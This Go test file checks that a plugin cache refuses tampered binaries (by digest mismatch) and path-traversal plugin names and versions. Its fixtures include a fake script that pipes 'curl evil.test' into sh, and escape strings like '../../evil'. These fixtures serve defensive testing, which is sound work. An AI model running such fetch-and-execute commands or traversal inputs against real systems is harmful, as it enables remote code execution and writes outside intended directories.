package plugindist

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/setthasit/Lore/internal/config"
	"github.com/setthasit/Lore/internal/errors/internalerror"
	"github.com/setthasit/Lore/internal/plugindist/plugindisttest"
)

func TestPluginBinaryRefusesARewrittenCachedBinary(t *testing.T) {
	t.Parallel()

	scene := newScene(t)
	lock, result := scene.installed(t)

	if err := os.WriteFile(result.Binary, []byte("#!/bin/sh\ncurl evil.test | sh\n"), 0o755); err != nil {
		t.Fatalf("rewrite the cached binary: %v", err)
	}

	_, err := scene.store.Binary(scene.coord, lock)
	if err == nil {
		t.Fatal("launching a rewritten cached binary succeeded, want a refusal")
	}
	if !internalerror.IsPrecondition(err) {
		t.Fatalf("kind = %v, want precondition", internalerror.KindOf(err))
	}
	for _, want := range []string{"plugins[linear]", "digest mismatch", scene.store.platform.Key(), result.BinaryDigest} {
		if !strings.Contains(err.Error(), want) {
			t.Fatalf("error %q does not mention %q", err, want)
		}
	}
}

func TestPluginBinaryWithoutALockEntryFailsAtStartup(t *testing.T) {
	t.Parallel()

	scene := newScene(t)
	lock, _ := scene.installed(t)

	elsewhere := NewStore(scene.store.root)
	elsewhere.platform = Platform{OS: "plan9", Arch: "mips"}
	_, err := elsewhere.Binary(scene.coord, lock)
	if err == nil {
		t.Fatal("launching a plugin locked for another platform succeeded, want a refusal")
	}
	for _, want := range []string{"plugins[linear]", LockFileName, "plan9/mips", "lore plugin install linear"} {
		if !strings.Contains(err.Error(), want) {
			t.Fatalf("error %q does not mention %q", err, want)
		}
	}
}

func TestPluginBinaryNotInstalledNamesTheInstallCommand(t *testing.T) {
	t.Parallel()

	scene := newScene(t)
	lock := &Lock{}
	lock.Set("linear", "v0.3.1", scene.coord.From, scene.store.platform,
		LockArtifact{URL: "https://example.test/x.tar.gz", Digest: "sha256:aaaa"})

	_, err := scene.store.Binary(scene.coord, lock)
	if err == nil {
		t.Fatal("launching an uninstalled plugin succeeded, want a refusal")
	}

	for _, want := range []string{"plugins[linear]", "is not installed", "lore plugin install linear"} {
		if !strings.Contains(internalerror.MessageOf(err), want) {
			t.Fatalf("message %q does not mention %q", internalerror.MessageOf(err), want)
		}
	}
}

func TestPluginRemoveDeletesEveryCachedVersion(t *testing.T) {
	t.Parallel()

	scene := newScene(t)
	lock, _ := scene.installed(t)

	next := plugindisttest.Archive(t, scene.coord.binaryName(scene.store.platform), []byte("#!/bin/sh\necho v0.4.0\n"))
	moved, err := scene.coord.AtVersion("v0.4.0")
	if err != nil {
		t.Fatalf("move the coordinate: %v", err)
	}
	scene.fake.Publish("v0.4.0", map[string][]byte{moved.assetName(scene.store.platform): next})
	scene.coord = moved
	if _, err := scene.install(t, lock, true); err != nil {
		t.Fatalf("install v0.4.0: %v", err)
	}

	versions, err := scene.store.Remove("linear")
	if err != nil {
		t.Fatalf("remove: %v", err)
	}
	if versions != 2 {
		t.Fatalf("removed %d versions, want 2", versions)
	}
	if _, err := os.Stat(filepath.Join(scene.store.root, "plugins", "linear")); !os.IsNotExist(err) {
		t.Fatal("the plugin cache survived a removal")
	}

	if versions, err = scene.store.Remove("linear"); err != nil || versions != 0 {
		t.Fatalf("second remove: %d versions, %v", versions, err)
	}
}

func TestPluginBinaryLocalMissingFileIsRefused(t *testing.T) {
	t.Parallel()

	coord, err := Resolve(".", config.PluginDecl{Name: "scratch", From: filepath.Join(t.TempDir(), "lore-scratch")})
	if err != nil {
		t.Fatalf("resolve: %v", err)
	}

	if _, err := NewStore(t.TempDir()).Binary(coord, &Lock{}); err == nil {
		t.Fatal("locating an absent local plugin succeeded, want a refusal")
	} else if !strings.Contains(err.Error(), "no file there") {
		t.Fatalf("error %q does not say the file is missing", err)
	}
}

func TestPluginStoreRootIsOverridable(t *testing.T) {
	t.Setenv(RootEnv, filepath.Join(t.TempDir(), "state"))

	root, err := defaultRoot()
	if err != nil {
		t.Fatalf("default root: %v", err)
	}
	if !strings.HasSuffix(root, "state") {
		t.Fatalf("root = %q, want the overridden directory", root)
	}
}

func TestPluginRemoveRefusesANameThatLeavesTheCache(t *testing.T) {
	t.Parallel()

	scene := newScene(t)
	sentinel := filepath.Join(scene.store.root, "myproject.db")
	if err := os.WriteFile(sentinel, []byte("an index the cache sits beside"), 0o600); err != nil {
		t.Fatalf("write the sentinel: %v", err)
	}

	for _, name := range []string{"..", "../..", "../pwned"} {
		versions, err := scene.store.Remove(name)
		if err == nil {
			t.Errorf("removing %q succeeded, want a refusal", name)
		} else if !internalerror.IsBadRequest(err) {
			t.Errorf("name %q: kind = %v, want bad request", name, internalerror.KindOf(err))
		}
		if versions != 0 {
			t.Errorf("removing %q reported %d deleted versions", name, versions)
		}
	}

	if _, err := os.Stat(sentinel); err != nil {
		t.Fatalf("a file beside the plugin cache was deleted: %v", err)
	}
	if _, err := os.Stat(scene.store.root); err != nil {
		t.Fatalf("the cache root was deleted: %v", err)
	}
}

func TestStoreWriteRefusesABinaryNameThatIsNotOneFileName(t *testing.T) {
	t.Parallel()

	scene := newScene(t)
	_, result := scene.installed(t)
	dir := filepath.Dir(result.Binary)

	for _, binaryName := range []string{digestFileName, `..\..\evil.exe`, "sub/evil", ".."} {
		path, digest, err := scene.store.write("linear", "v0.3.1", binaryName, []byte("evil\n"))
		if err == nil {
			t.Errorf("writing a binary named %q succeeded, want a refusal", binaryName)
		} else if !internalerror.IsPrecondition(err) {
			t.Errorf("name %q: kind = %v, want precondition", binaryName, internalerror.KindOf(err))
		} else if !strings.Contains(err.Error(), "plugins[linear]") {
			t.Errorf("error %q does not name the plugin", err)
		}
		if path != "" || digest != "" {
			t.Errorf("name %q reported path %q and digest %q", binaryName, path, digest)
		}
	}

	recorded, err := os.ReadFile(filepath.Join(dir, digestFileName))
	if err != nil {
		t.Fatalf("read the digest file: %v", err)
	}
	if want := digestOf([]byte(stubBinary)) + "\n"; string(recorded) != want {
		t.Fatalf("digest file = %q, want the digest of the installed binary %q", recorded, want)
	}

	entries, err := os.ReadDir(dir)
	if err != nil {
		t.Fatalf("read the version directory: %v", err)
	}
	for _, entry := range entries {
		if strings.HasSuffix(entry.Name(), ".partial") {
			t.Errorf("a staged %q survived the refusal", entry.Name())
		}
	}
}

func TestPluginBinaryRefusesALockedVersionThatLeavesTheCache(t *testing.T) {
	t.Parallel()

	scene := newScene(t)
	lock, _ := scene.installed(t)

	const escape = "../../evil"
	planted := filepath.Join(scene.store.root, "plugins", "linear", escape)
	if err := os.MkdirAll(planted, 0o750); err != nil {
		t.Fatalf("plant the escape target: %v", err)
	}
	body := []byte("#!/bin/sh\ncurl evil.test | sh\n")
	if err := os.WriteFile(filepath.Join(planted, "lore-linear"), body, 0o600); err != nil {
		t.Fatalf("plant the binary: %v", err)
	}
	// The planted digest matches the planted binary, so only the version's shape can refuse it.
	if err := os.WriteFile(filepath.Join(planted, digestFileName), []byte(digestOf(body)+"\n"), 0o600); err != nil {
		t.Fatalf("plant the digest: %v", err)
	}

	entry, _ := lock.Entry("linear")
	entry.Version = escape
	lock.Plugins["linear"] = entry

	path, err := scene.store.Binary(scene.coord, lock)
	if err == nil {
		t.Fatalf("a locked version that climbs out of the cache resolved to %q, want a refusal", path)
	}
	if path != "" {
		t.Errorf("the refusal still reported the binary %q", path)
	}
	if !internalerror.IsBadRequest(err) {
		t.Errorf("kind = %v, want bad request", internalerror.KindOf(err))
	}
	if strings.Contains(err.Error(), "digest mismatch") {
		t.Errorf("the traversal was refused by the digest re-check, not by the version: %v", err)
	}
	for _, want := range []string{"plugins[linear]", escape, "not a usable version"} {
		if !strings.Contains(err.Error(), want) {
			t.Errorf("error %q does not mention %q", err, want)
		}
	}
}

func TestStoreRefusesAVersionThatIsNotOneDirectoryName(t *testing.T) {
	t.Parallel()

	// The root is nested so that a version climbing four levels still lands under area.
	area := t.TempDir()
	store := NewStore(filepath.Join(area, "deep", "state"))
	for _, version := range []string{"", "..", "../../evil", "../../../../tmp/evil", `..\..\evil`} {
		if _, err := store.Dir("linear", version); err == nil {
			t.Errorf("Dir accepted the version %q", version)
		} else if !internalerror.IsBadRequest(err) {
			t.Errorf("version %q: kind = %v, want bad request", version, internalerror.KindOf(err))
		}

		path, digest, err := store.write("linear", version, "lore-linear", []byte("evil\n"))
		if err == nil {
			t.Errorf("write accepted the version %q", version)
		} else if !internalerror.IsBadRequest(err) {
			t.Errorf("write of version %q: kind = %v, want bad request", version, internalerror.KindOf(err))
		}
		if path != "" || digest != "" {
			t.Errorf("write of version %q reported path %q and digest %q", version, path, digest)
		}
	}

	entries, err := os.ReadDir(area)
	if err != nil {
		t.Fatalf("read the temporary area: %v", err)
	}
	if len(entries) != 0 {
		t.Fatalf("a refused version created %d entries around the cache root, want none", len(entries))
	}
}

func TestStoreRefusesANameThatIsNotOneDirectoryName(t *testing.T) {
	t.Parallel()

	area := t.TempDir()
	store := NewStore(filepath.Join(area, "deep", "state"))
	for _, name := range []string{"", "..", "../evil", `..\evil`} {
		if _, err := store.Dir(name, "v0.3.1"); err == nil {
			t.Errorf("Dir accepted the name %q", name)
		} else if !internalerror.IsBadRequest(err) {
			t.Errorf("name %q: kind = %v, want bad request", name, internalerror.KindOf(err))
		}

		path, digest, err := store.write(name, "v0.3.1", "lore-linear", []byte("evil\n"))
		if err == nil {
			t.Errorf("write accepted the name %q", name)
		} else if !internalerror.IsBadRequest(err) {
			t.Errorf("write of name %q: kind = %v, want bad request", name, internalerror.KindOf(err))
		}
		if path != "" || digest != "" {
			t.Errorf("write of name %q reported path %q and digest %q", name, path, digest)
		}
	}

	entries, err := os.ReadDir(area)
	if err != nil {
		t.Fatalf("read the temporary area: %v", err)
	}
	if len(entries) != 0 {
		t.Fatalf("a refused name created %d entries around the cache root, want none", len(entries))
	}
}
